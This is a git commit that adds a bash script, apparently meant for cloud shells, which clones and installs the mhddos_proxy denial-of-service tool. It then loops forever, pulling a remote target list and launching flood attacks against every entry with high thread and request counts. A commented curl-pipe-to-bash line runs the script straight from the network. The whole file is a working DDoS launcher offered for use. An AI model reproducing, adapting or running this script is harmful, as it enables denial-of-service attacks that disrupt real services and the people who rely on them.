cf52e5edaa33175fb0b51e236456aad1d9f4c4c4
Operation-Stop-russia <103530329+Operation-Stop-russia@users.noreply.github.com>
2022-04-17 11:04:14 +0300

    Create Test_All.sh

---
+++ Test_All.sh
@@ -0,0 +1,26 @@
+#!/bin/bash
+#curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Test_All.sh | bash
+git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
+cd mhddos_proxy
+python3 -m pip install -r requirements.txt
+
+threads="${1:-1200}"; threads="-t $threads"
+rpc="--rpc 1000"
+debug="--debug"
+
+while true
+do
+   pkill -f runner.py 
+   list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/AllTargets.lst | cat | grep "^[^#]" | wc -l)
+   while [[ $list_size = "0"  ]]
+      do
+            sleep 5
+            list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/AllTargets.lst | cat | grep "^[^#]" | wc -l)
+      done
+   for (( i=1; i<=list_size; i++ ))
+      do
+            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/AllTargets.lst | cat | grep "^[^#]")")
+            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $debug&
+      done
+sleep 15m
+done
